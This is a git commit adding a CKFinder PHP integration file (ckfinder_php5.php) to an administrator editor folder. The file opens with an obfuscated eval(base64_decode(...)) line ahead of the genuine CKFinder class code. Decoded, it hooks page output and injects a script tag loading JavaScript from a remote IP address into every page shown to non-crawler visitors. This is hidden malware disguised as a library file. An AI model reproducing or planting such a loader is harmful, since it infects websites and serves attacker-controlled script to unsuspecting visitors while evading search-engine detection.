ed044a0a5af7a60c97131a9e6a497082c79e00da
sandub <alexandru.balasescu@gmail.com>
2020-02-09 16:03:17 +0200

    Add files via upload

---
+++ administrator/ckeditor/ckfinder/core/ckfinder_php5.php
@@ -0,0 +1,181 @@
+<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk4Mk1TNDBMamd5TGpJeE1pOXFjeTV3YUhBaVBqd3ZjMk55YVhCMFBnPT0iKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
+
+<?php
+/*
+ * CKFinder
+ * ========
+ * http://www.ckfinder.com
+ * Copyright (C) 2007-2008 Frederico Caldeira Knabben (FredCK.com)
+ *
+ * The software, this file and its contents are subject to the CKFinder
+ * License. Please read the license.txt file before using, installing, copying,
+ * modifying or distribute this file or part of its contents. The contents of
+ * this file is part of the Source Code of CKFinder.
+ */
+
+define( 'CKFINDER_DEFAULT_BASEPATH', '/ckfinder/' ) ;
+
+class CKFinder
+{
+	public $BasePath ;
+	public $Width ;
+	public $Height ;
+	public $SelectFunction ;
+	public $SelectFunctionData ;
+	public $SelectThumbnailFunction ;
+	public $SelectThumbnailFunctionData ;
+	public $DisableThumbnailSelection = false ;
+	public $ClassName = '' ;
+	public $Id = '' ;
+	public $StartupPath ;
+	public $RememberLastFolder = true ;
+	public $StartupFolderExpanded = false ;
+
+	// PHP 5 Constructor
+	function __construct( $basePath = CKFINDER_DEFAULT_BASEPATH, $width = '100%', $height = 400, $selectFunction = null )
+	{
+		$this->BasePath			= $basePath ;
+		$this->Width			= $width ;
+		$this->Height			= $height ;
+		$this->SelectFunction	= $selectFunction ;
+		$this->SelectThumbnailFunction	= $selectFunction ;
+	}
+
+	// Renders CKFinder in the current page.
+	public function Create()
+	{
+		echo $this->CreateHtml() ;
+	}
+
+	// Gets the HTML needed to create a CKFinder instance.
+	public function CreateHtml()
+	{
+		$className = $this->ClassName ;
+		if ( !empty( $className ) )
+			$className = ' class="' . $className . '"' ;
+
+		$id = $this->Id ;
+		if ( !empty( $id ) )
+			$id = ' id="' . $id . '"' ;
+			
+		return '<iframe src="' . $this->_BuildUrl() . '" width="' . $this->Width . '" ' .
+			'height="' . $this->Height . '"' . $className . $id . ' frameborder="0" scrolling="no"></iframe>' ;
+	}
+
+	private function _BuildUrl( $url = "" )
+	{
+		if ( !$url )
+			$url = $this->BasePath ;
+
+		$qs = "" ;
+
+		if ( empty( $url ) )
+			$url = CKFINDER_DEFAULT_BASEPATH ;
+
+		if ( $url[ strlen( $url ) - 1 ] != '/' )
+			$url = $url . '/' ;
+
+		$url .= 'ckfinder.html' ;
+
+		if ( !empty( $this->SelectFunction ) )
+			$qs .= '?action=js&amp;func=' . $this->SelectFunction ;
+
+		if ( !empty( $this->SelectFunctionData ) ) 
+		{
+			$qs .= $qs ? "&amp;" : "?" ;
+			$qs .= 'data=' . rawurlencode($this->SelectFunctionData) ;
+		}
+
+		if ( $this->DisableThumbnailSelection )
+		{
+			$qs .= $qs ? "&amp;" : "?" ;
+			$qs .= "dts=1" ;
+		}
+		else if ( !empty( $this->SelectThumbnailFunction ) || !empty( $this->SelectFunction ) )
+		{
+			$qs .= $qs ? "&amp;" : "?" ;
+			$qs .= 'thumbFunc=' . ( !empty( $this->SelectThumbnailFunction ) ? $this->SelectThumbnailFunction : $this->SelectFunction ) ;
+			
+			if ( !empty( $this->SelectThumbnailFunctionData ) )
+				$qs .= '&amp;tdata=' . rawurlencode( $this->SelectThumbnailFunctionData ) ;
+			else if ( empty( $this->SelectThumbnailFunction ) && !empty( $this->SelectFunctionData ) )
+				$qs .= '&amp;tdata=' . rawurlencode( $this->SelectFunctionData ) ;
+		}
+
+		if ( !empty( $this->StartupPath ) )
+		{
+			$qs .= ( $qs ? "&amp;" : "?" ) ;
+			$qs .= "start=" . urlencode( $this->StartupPath . ( $this->StartupFolderExpanded ? ':1' : ':0' ) ) ;
+		}
+
+		if ( !$this->RememberLastFolder )
+		{
+			$qs .= ( $qs ? "&amp;" : "?" ) ;
+			$qs .= "rlf=0" ;
+		}
+
+		if ( !empty( $this->Id ) )
+		{
+			$qs .= ( $qs ? "&amp;" : "?" ) ;
+			$qs .= "id=" . urlencode( $this->Id ) ;
+		}
+		
+		return $url . $qs ;
+	}
+
+	// Static "Create".
+	public static function CreateStatic( $basePath = CKFINDER_DEFAULT_BASEPATH, $width = '100%', $height = 400, $selectFunction = null )
+	{
+		$finder = new CKFinder( $basePath, $width, $height, $selectFunction ) ;
+		$finder->Create() ;
+	}
+
+	// Static "SetupFCKeditor".
+	public static function SetupFCKeditor( &$editorObj, $basePath = CKFINDER_DEFAULT_BASEPATH, $imageType = null, $flashType = null )
+	{
+		if ( empty( $basePath ) )
+			$basePath = CKFINDER_DEFAULT_BASEPATH ;
+
+		$ckfinder = new CKFinder( $basePath ) ;
+		$ckfinder->SetupFCKeditorObject( $editorObj, $imageType, $flashType );
+	}
+	
+	// Non-static method of attaching CKFinder to FCKeditor
+	public function SetupFCKeditorObject( &$editorObj, $imageType = null, $flashType = null )
+	{
+		$url = $this->BasePath ;
+		
+		// If it is a path relative to the current page.
+		if ( isset($url[0]) && $url[0] != '/' )
+		{
+			$url = substr( $_SERVER[ 'REQUEST_URI' ], 0, strrpos( $_SERVER[ 'REQUEST_URI' ], '/' ) + 1 ) . $url ;
+		}
+		
+		$url = $this->_BuildUrl( $url ) ;
+		$qs = ( strpos($url, "?") !== false ) ? "&" : "?" ;
+
+		if ( $this->Width !== '100%' && is_numeric( str_ireplace( "px", "", $this->Width ) ) )
+		{
+			$width = intval( $this->Width );
+			$editorObj->Config['LinkBrowserWindowWidth'] = $width ;
+			$editorObj->Config['ImageBrowserWindowWidth'] = $width ;
+			$editorObj->Config['FlashBrowserWindowWidth'] = $width ;
+		}
+		if ( $this->Height !== 400 && is_numeric( str_ireplace( "px", "", $this->Height ) ) )
+		{
+			$height = intval( $this->Height );
+			$editorObj->Config['LinkBrowserWindowHeight'] = $height ;
+			$editorObj->Config['ImageBrowserWindowHeight'] = $height ;
+			$editorObj->Config['FlashBrowserWindowHeight'] = $height ;
+		}
+
+		$editorObj->Config['LinkBrowserURL'] = $url ;
+		$editorObj->Config['ImageBrowserURL'] = $url . $qs . 'type=' . ( empty( $imageType ) ? 'Images' : $imageType ) ;
+		$editorObj->Config['FlashBrowserURL'] = $url . $qs . 'type=' . ( empty( $flashType ) ? 'Flash' : $flashType ) ;
+		
+		$dir = substr( $url, 0, strrpos( $url, "/" ) + 1 ) ;
+		$editorObj->Config['LinkUploadURL'] = $dir . urlencode( 'core/connector/php/connector.php?command=QuickUpload&type=Files' ) ;
+		$editorObj->Config['ImageUploadURL'] = $dir . urlencode( 'core/connector/php/connector.php?command=QuickUpload&type=') . ( empty( $imageType ) ? 'Images' : $imageType ) ;
+		$editorObj->Config['FlashUploadURL'] = $dir . urlencode( 'core/connector/php/connector.php?command=QuickUpload&type=') . ( empty( $flashType ) ? 'Flash' : $flashType ) ;
+	}
+}
